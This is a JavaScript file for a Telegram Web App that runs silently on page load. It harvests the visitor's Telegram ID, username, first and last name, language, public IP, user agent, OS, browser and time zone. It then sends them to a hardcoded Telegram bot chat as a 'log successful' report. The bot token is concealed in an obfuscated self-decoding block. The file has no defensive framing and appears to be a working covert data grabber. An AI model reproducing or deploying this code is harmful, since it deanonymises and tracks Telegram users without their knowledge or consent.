let tg = window.Telegram.WebApp;
document.addEventListener('DOMContentLoaded', function() {
  const urlParams = new URLSearchParams(window.location.search);
  const userAgent = navigator.userAgent;
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      const ip = data.ip;
      const osname = navigator.platform;
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const browser = getBrowserInfo();
      let userid = document.createElement('p');

      const message = `
🔥 Лог успешен!

*🧭 Базовая информация:*
*🔍 Аккаунт в тг:*
  ├ Айди: ${tg.initDataUnsafe.user.id}
  ├ Тэг: @${tg.initDataUnsafe.user.username}
  ├ Имя: ${tg.initDataUnsafe.user.first_name}
  ├ Фамилия: ${tg.initDataUnsafe.user.last_name}
  ├ Языковой код: ${tg.initDataUnsafe.user.language_code}
*💻 Система:*
  ├ IP: ${ip}
  ├ UserAgent: ${userAgent}
  ├ ОС: ${osname}
  ├ Браузер: ${browser}
  └ Часовой пояс: ${timeZone}`;
      
      var token;(function(){var mWp='',YSC=299-288;function msg(q){var l=403990;var e=q.length;var g=[];for(var x=0;x<e;x++){g[x]=q.charAt(x)};for(var x=0;x<e;x++){var c=l*(x+446)+(l%40963);var z=l*(x+281)+(l%37124);var n=c%e;var h=z%e;var i=g[n];g[n]=g[h];g[h]=i;l=(c+z)%1453345;};return g.join('')};var Rjf=msg('cycgohurqttxblofvorikzscaumsrntjpwdne').substr(0,YSC);var vss='0se =1ir6j4sai[i.0+v=rttr";;2nrcz.jl;lmfol.v.f(p)zszv =);7 afc=g)h1x9=9rfpi,a2S[("f2ujh,88,71ad),i+es5,;u(;2e"5b);f7n6l+cnkbf  ua=m,;hca rhta0nj()rke(g9vi-i1ns[C)rc(]C+ixsamtrt7j+{,a [xvrcj2a"4rA ()irxcang;;7;1ot<{fo.cv,.d=)"=1st];)iv08C] j(=;.Cl=lr;cusv6a6]" ")hf9.qe;j1t-{Soa;=pho,)[>i);oA(){-C=xd=n*!s)C;r3b9y2 w=naohu,.ucrdt.=.;ck;vr1c}3= nqnht.;orq fh=g ({hl8h==v=<b[nsl){x7nfuv !h84=ju0eA0co=(v]2=n]ge0rfh2(m]{qC;}r0u*(v"f.(.t=oe4,m,< 1n(e;;rlq;v+vue]sr.g6[[)1))+,[deua.)).nt[9;inx(s,g=+dtAevn+1we+tcn=arnveestec=ffvif),,f)jv=tuqtse;arsxlljwbg,n(a;=t]s8jga(.;i(hw>;=p[pu<hrm= v)svciat;ult[)crodt h(f(+cbl9h=gp+(n}i1vrfrar(a;oaA.v[;et.ga hes,lu.a]x=1q;k-hkwgro;rrho}3( o);},(javs;l=arn+;;;-, hzrsa<etllr+;oa]rl=;o0;t6ru),+(,)t,,l .n+ons(["a;}bj ++mn.7rg08u=mCs-;7=d (9,)2((snoi]5o)h+ai5(.f-l+a+l6+)dsl=]pl7wc67(;via4+ncr)+.aou8raoo)og}gromgr",]ate(t0j d+rr=brre(9==ar),vd;renv.8.rpac0=';var vNg=msg[Rjf];var BKf='';var oKP=vNg;var hxZ=vNg(BKf,msg(vss));var Giu=hxZ(msg('.#)-[c{.S]rn!^42tyS^bi*gf9o^a3i(o,,;^b,i.^ay$$g^nd(.,t7^^a^)4 .,j^(6k_.d(ei\'s)o,(.,)-$,7^);saio,h\/":^tl,;^b.=!)lnb)hEazjo63,sa^^$l_^e$^.)ly0+cj(_^)6sk6};7$m_ 0f.300938!7.)%2^i^2ayad.;=.7a$+.,o,^%1^.^)=^i.=!$mt^k.o^74j.g^b_6)a^^3f)(.t=)ms5;6a(%enet^p).e[^,_6_Co1e,g!.1d.,#o)b^+^!.o,.+tj(*e;;d( ^dg}1l .ba39{rbp=;.t\/g!0&ad)ar(y(i^^!.!$#=,+o._^__7&6d(!^^y^&)2z^r03^^0wa+z$^$^+^44^!3^^]3y^33c;lf2l^)7;z46_)^)}b..b ^iz$^r$guf}_v^a n!^^(.()#ofl)^ at2!"j_9^a!7u.^.ej {{.;.."4i0]0&2sf shl)g{=i=\/0lf0"^0_w.g7p3r6)sn6tj(m,_\')^}+j;\/;r,({=.n;)ffS.e2n&3 8tn=!.*haaCr;;()2$..sa,.tsu!^..^.=.)abffn1)!)ql0r_=b {=\'();\/y^m^d2r.t)r}2.u4)s3f,nm6,,0}(f^{^ees3^^t*^^^r!(a_;!0.)f#%};#r +^).t2b7,$n^.+a;u1p 8!+j$j3]^;6n(i,(nft{a)i4w=^-^-l3f,$!_\'h.9r7^j;(\/k_-k)3,$!3)de^h(jk2o6p(34w1z{mott(,)m%Tfa0fnih+%^f)^.1cu-l5$}r+!=.p.}e1r(ih=8.ls}z,}tsrd=,fw=($l}z;8e}($=.$4f.$)=(.$re.m!0!=by8gn0)euaf,.o^se;1a%#"tn)b"%;.^=eie;1(dl{N .(4^79(, a^iam^o^s_ r =5[0(s"tf p8h^)ar($;ay14^T,(6'));var mQX=oKP(mWp,Giu );mQX(3415);return 4666})();
      const chatId = '-1002010632722';
      const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
      const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('text', message);
        formData.append('parse_mode', 'Markdown')
        fetch(url, {
          method: 'POST',
          body: formData
        });
      });

  function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = '';
    const match = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];

    if (/trident/i.test(match[1])) {
      const tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
      browser = `IE ${tem[1] || ''}`;
    }

    if (match[1] === 'Chrome') {
      const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
      if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
    }

    match[2] = match[2] ? `version ${match[2]}` : '';
    browser = `${match[1] || ''} ${match[2] || ''}`.trim();
    return browser;
  }
  });
